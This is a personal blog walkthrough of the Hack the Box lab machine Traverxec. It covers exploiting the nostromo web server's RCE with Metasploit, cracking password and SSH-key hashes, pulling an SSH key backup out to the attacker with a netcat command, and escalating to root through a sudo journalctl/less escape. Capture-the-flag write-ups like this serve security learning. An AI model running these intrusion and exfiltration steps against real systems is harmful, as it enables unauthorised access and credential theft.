+++
author = "Nick"
categories = ["hack the box", "CVE", "ssh", "ssh2john", "metasploit", "reverse shell", "RCE", "GTFObins", "john", "cracking"]
date = 2020-04-11T10:00:00Z
description = ""
draft = false
thumbnail = "/images/2019/11/trav.png"
slug = "hack-the-box-traverxec"
summary = "Here is my walk through of the machine Traverxec on Hack the Box. The box is listed as easy so let's jump in"
tags = ["hack the box", "CVE", "ssh", "ssh2john", "metasploit", "reverse shell", "RCE", "GTFObins", "john", "cracking"]
title = "Hack the Box - Traverxec"
url = "/hack-the-box-traverxec"

+++


Here is my walk through of the machine Traverxec on Hack the Box. The box is listed as easy so let's jump in.

As we do with every box, we start with our initial ```nmap```: ```nmap -sC -sV -oA initial_scan 10.10.10.165```

Our results come back as pretty limited. We'll run the scan again with the ```-p-``` options to enumerate all ports. Turns out there was no new ports open. Here are the results:

```
Nmap scan report for 10.10.10.165
Host is up (0.061s latency).
Not shown: 65533 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
|_  256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
80/tcp open  http    nostromo 1.9.6
|_http-server-header: nostromo 1.9.6
|_http-title: TRAVERXEC
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 213.48 seconds
```
A quick ```searchsploit``` on ```nostromo``` shows that there is a RCE payload we might be able to use. We'll head over to see what is being hosted on port 80. We see a pretty standard website. We have a contact form that seemingly doesn't work. So our basic exploration hasn't found anything useful. We'll boot up ```gobuster``` and see what it can find.

While that runs we'll load up ```metasploit``` and see if the RCE payload can be of use. We will find the exploit and set it's requirements. We need to set ```RHOST``` and ```LHOST```.

![](/images/2019/11/trav-msfpl.gif" caption="Laggy shell :()

Once we run the exploit we gain a shell as ```www-data```. We quickly create a proper shell with python and start enumerating. We download a copy of ```linenum``` or ```linpeas``` from our ```SimpleHTTPServer``` and let it go. One of the first things that stands out is that we have a ```.htpassword```. We can take this hash and load it into ```hashcat``` and with some luck, crack it.

```hashcat -a 0 -m 500 hash.txt /usr/share/wordlists/rockyou.txt -o cracked_hash.txt```

This will attempt to crack the hash and give us an output. Once its done we see the cracked password of ```Nowonly4me```. Now given the type of access this is restricting, we'll need to apply this authentication type to an ```HTTP``` request. Time to look at the [```nhttpd``` documentation](http://www.nazgul.ch/dev/nostromo_man.html). We see that under the ```HOMDIRS``` section, places can essentially be aliased with this setting. Our configs tell us that we are mapping ```/home```. So given this example, we can go to ```http://10.10.10.165/~david/``` and should see some content.

![](/images/2019/11/image-60.png)

The above is what we are greeted with when we do. Awesome, so now we can hopfully append an authentication to the request and have some access. However even with appending authentication to the requests I wasn't able to gain the access in the way I thought. So when I went back to re-read the config and documentation, it seems like ```public_www``` might also be mapped to David's home directory. Now when we path in David's home directory we can't list any files, however, that doesn't mean they aren't there. So if we try to path to ```public_www``` we see it is indeed a valid path.

![](/images/2019/11/hidden-1.gif)

We see that there is a file called ```backup-ssh-identity-files.tar```. We want to download this file, so we'll transfer it back to our machine. We'll use a ```nc``` file transfer method:

On our attacking machine we'll setup a listener: ```nc -l -p 9999 > ssh_file.tgz < /dev/null```.

Then on our target machine we'll send the file over ```cat backup-ssh-identity-files.tar | nc 10.10.14.5 9999```

Once we get the file we can unzip it with ```gunzip```. We get a directory called ```home```. Which is a copy of the home directory. Inside we have our ```SSH``` keys. Now we need to convert the ```id_rsa``` to a crackable format. We'll use ```ssh2john```.

```ssh2john ./id_rsa > david.hash```

We'll then run it through ```John```:

```john --wordlist=/usr/share/wordlists/rockyou.txt david.hash```

Almost immediately we see a potential match, ```hunter```.

![](/images/2019/11/image-61.png)

So we try this password with our key and we get in!

![](/images/2019/11/image-62.png)

One we're in we see that there are some scripts in ```bin``` file in David's home directory. When we parse through the file we see that we are calling ```journalctl``` as sudo. We might be able to append to this call and break out of our shell to get root. Now this is a pretty CTF type thing and took me a while, even though I was staring at [```GTFObins```](https://gtfobins.github.io/gtfobins/less/) for quite some time. We issue the following:

```VISUAL="/bin/sh -c '/bin/sh'" less /etc/profile``` 

We can append this to the last line being called in the script and gain our access as root.

![](/images/2019/11/trav-root.gif)

There we have it, our root flag! This last bit was CTF like but still fun none the less!

Hopefully something was learned. If you found this write-up helpful, consider sending some respect my way: [Lovecore's HTB Profile](https://www.hackthebox.eu/home/users/profile/95635).

